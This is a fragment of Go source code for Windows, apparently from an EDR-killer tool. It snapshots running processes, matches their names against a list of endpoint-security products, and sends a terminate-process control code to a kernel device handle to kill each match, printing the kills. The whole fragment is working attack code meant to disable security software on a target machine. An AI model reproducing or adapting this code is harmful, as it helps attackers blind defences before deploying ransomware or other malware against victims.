func DeviceIoControl(p1 windows.Handle, p2 uint32, p3 uintptr, p4 uint32, p5 uintptr, p6 uint32, p7 *uint32, p8 uintptr) (err error) {
	r1, _, e1 := syscall.Syscall9(devico.Addr(), 8, uintptr(p1), uintptr(p2), p3, uintptr(p4), p5, uintptr(p6), uintptr(unsafe.Pointer(p7)), p8, 0)
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func edrcheck(hDevice windows.Handle) int {
	var procId, pOutbuff uint32
	var bytesRet uint32
	var ecount int
	var hSnap windows.Handle

	hSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		fmt.Println("ermm.... failed to create process snapshot:", err)
		return ecount
	}
	defer windows.CloseHandle(hSnap)

	var pE windows.ProcessEntry32
	pE.Size = uint32(unsafe.Sizeof(pE))

	err = windows.Process32First(hSnap, &pE)

	for {
		if err != nil {
			break
		}
		exeName := windows.UTF16ToString(pE.ExeFile[:])
		if edrlistcheck(exeName) {
			procId = pE.ProcessID
			err := DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS,
				uintptr(unsafe.Pointer(&procId)), uint32(unsafe.Sizeof(procId)),
				uintptr(unsafe.Pointer(&pOutbuff)), uint32(unsafe.Sizeof(pOutbuff)),
				&bytesRet, 0)
			if err != nil {
				fmt.Printf("erm... failed to terminate %s !!\n", exeName)
			} else {
				fmt.Printf("erm... terminated %s\n", exeName)
				ecount++
			}
		}
		err = windows.Process32Next(hSnap, &pE)
	}
	return ecount
}
